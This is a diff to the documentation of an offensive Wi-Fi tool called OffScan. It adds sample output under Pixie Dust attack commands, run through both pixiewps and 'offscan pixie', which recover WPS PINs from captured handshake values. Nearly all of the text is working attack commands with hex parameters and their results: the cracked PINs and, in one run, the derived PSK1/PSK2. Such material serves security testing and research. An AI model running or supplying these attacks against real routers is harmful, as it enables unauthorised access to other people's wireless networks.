@@ -58,6 +58,12 @@ pixiewps -e aa:6d:ae:07:da:86:20:85:3c:7a:29:a8:81:20:2f:d7:e2:fe:2a:57:25:e5:c3
 -m 47:2f:04:b1:ab:85:0d:fb:9a:0d:82:4e:35:0e:91:57 \
 -v 1 \
 --force
+
+ Pixiewps 1.4
+
+ [+] WPS pin:  23446144
+
+ [*] Time taken: 0 s 266 ms
 ```
 
 **Execution via `offscan pixie` (Native Go Implementation):**
@@ -70,6 +76,14 @@ offscan pixie -e aa:6d:ae:07:da:86:20:85:3c:7a:29:a8:81:20:2f:d7:e2:fe:2a:57:25:
 -n f0:a1:52:32:4b:27:7d:fe:6e:fc:f8:5e:e8:33:fb:9d \
 -m 47:2f:04:b1:ab:85:0d:fb:9a:0d:82:4e:35:0e:91:57 \
 --force
+OffScan - The offensive security and scanning tool for Wi-Fi
+Repository: https://github.com/olivercalazans/offscan
+
+[i] MODES..: 1, 2
+[i] Trying Ralink mode (1)
+[t] 0.08 seconds in execution
+
+[*] PIN: 23446144
 ```
 
 ---
@@ -84,6 +98,20 @@ pixiewps -a 7f:de:11:b9:69:1c:de:26:4a:21:a4:6f:eb:3d:b8:aa:aa:d7:30:09:09:32:b8
 -s 90:5f:f5:7d:93:e5:c4:3c:62:0d:26:65:dd:59:57:d5:ba:ba:f1:b7:30:91:72:7c:54:94:38:08:1e:13:35:38 \
 -z b0:2b:07:50:28:e7:6e:5f:fa:27:1b:31:92:85:43:cb:c5:6a:ec:73:e2:27:c3:b9:80:ec:5b:ed:88:f0:1e:ec \
 -n 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+
+ Pixiewps 1.4
+
+ [?] Mode:     1 (RT/MT/CL)
+ [*] Seed N1:  -
+ [*] Seed ES1: 0x00000000
+ [*] Seed ES2: 0x00000000
+ [*] PSK1:     d4eb0c2a3815e1a03d70db7431eb53a3
+ [*] PSK2:     d3b7e623f31d220a23ea07bb7f76658b
+ [*] ES1:      00000000000000000000000000000000
+ [*] ES2:      00000000000000000000000000000000
+ [+] WPS pin:  04847533
+
+ [*] Time taken: 0 s 15 ms
 ```
 
 **Execution via `offscan pixie`:**
@@ -94,4 +122,13 @@ offscan pixie -a 7f:de:11:b9:69:1c:de:26:4a:21:a4:6f:eb:3d:b8:aa:aa:d7:30:09:09:
 -1 90:5f:f5:7d:93:e5:c4:3c:62:0d:26:65:dd:59:57:d5:ba:ba:f1:b7:30:91:72:7c:54:94:38:08:1e:13:35:38 \
 -2 b0:2b:07:50:28:e7:6e:5f:fa:27:1b:31:92:85:43:cb:c5:6a:ec:73:e2:27:c3:b9:80:ec:5b:ed:88:f0:1e:ec \
 -n 00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
+
+OffScan - The offensive security and scanning tool for Wi-Fi
+Repository: https://github.com/olivercalazans/offscan
+
+[i] MODES..: 1, 3, 2
+[i] Trying Ralink mode (1)
+[t] 0.02 seconds in execution
+
+[*] PIN: 04847533
 ```
